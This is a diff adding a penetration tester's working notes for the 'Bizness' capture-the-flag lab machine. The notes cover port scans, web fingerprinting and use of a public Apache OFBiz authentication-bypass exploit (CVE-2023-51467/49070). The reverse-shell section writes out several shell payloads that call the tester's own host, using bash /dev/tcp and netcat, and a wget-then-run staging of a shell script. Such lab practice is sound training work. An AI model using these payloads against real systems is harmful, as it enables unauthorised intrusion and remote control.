@@ -1,0 +1,173 @@
+
+2024-01-12 13:17:21 CST -- START TIME
+###		Bizness		###
+--------------------------------------
+
+
+
+|================================================================
+- Name: 
+- IP Address: 10.129.40.66
+- OS: 
+- Notes: 
+
+//CREDS:
+
+//Flags:
+#User:
+#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+ping -c1 10.129.40.66
+
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.40.66
+ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80,443,39811
+
+sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open  http       nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp   open  ssl/http   nginx 1.18.0
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+| tls-nextprotoneg: 
+|_  http/1.1
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_ssl-date: TLS randomness does not represent time
+39811/tcp open  tcpwrapped
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+# UDP scan
+sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.40.66\tbizness.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+2024-01-12 13:33:33 CST -- 
+whatweb -a 1 http://bizness.htb/
+
+http://bizness.htb/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.40.66], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
+https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.129.40.66], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
+
+
+//WebInfo
+Powered by Apache OFBiz
+Designed by BootstrapMade 
+
+
+// EXPLOIT: Apache-OFBiz-Authentication-Bypass
+// (CVE-2023-51467 and CVE-2023-49070)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+
+git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
+
+
+2024-01-12 13:42:58 CST -- 
+//Scan for exploit
+python exploit.py -h 
+usage: exploit.py [-h] --url URL [--cmd CMD]
+
+Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).
+
+options:
+  -h, --help  show this help message and exit
+  --url URL   EFBIZ's URL to send requests to.
+  --cmd CMD   Command to run on the remote server. Optional.
+
+2024-01-12 13:44:06 CST -- 
+python exploit.py --url http://bizness.htb
+[+] Scanning started...
+[+] Apache OFBiz instance seems to be vulnerable.
+
+//TestCommunication BAck
+python exploit.py --url http://bizness.htb --cmd 'ping -c10 10.10.16.30'
+
+//Success on Pings!!!
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RevShell
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#StartListener
+sudo rlwrap -cAr nc -lvnp 443
+
+#Exploit
+2024-01-12 14:04:20 CST -- 
+python exploit.py --url https://bizness.htb --cmd '/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1'
+//Fail
+
+#Exploit
+2024-01-12 14:05:02 CST -- 
+python exploit.py --url https://bizness.htb --cmd 'nc 10.10.16.30 443 -e /bin/bash'
+//FAil
+
+#Exploit
+2024-01-12 14:06:18 CST -- 
+python exploit.py --url https://bizness.htb --cmd 'nc -c /bin/bash 10.10.16.30 443'
+//FAil
+
+
+cat revshell.sh 
+#!/usr/bin/env bash
+
+/bin/bash -i >& /dev/tcp/10.10.16.30/443 0>&1
+
+python -m http.server 80
+
+2024-01-12 14:11:02 CST -- 
+python exploit.py --url https://bizness.htb --cmd 'wget http://10.10.16.30:80/revshell.sh -O /tmp/revshell.sh'
+python exploit.py --url https://bizness.htb --cmd 'chmod 777 /tmp/revshell.sh'
+python exploit.py --url https://bizness.htb --cmd '/tmp/revshell.sh'
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
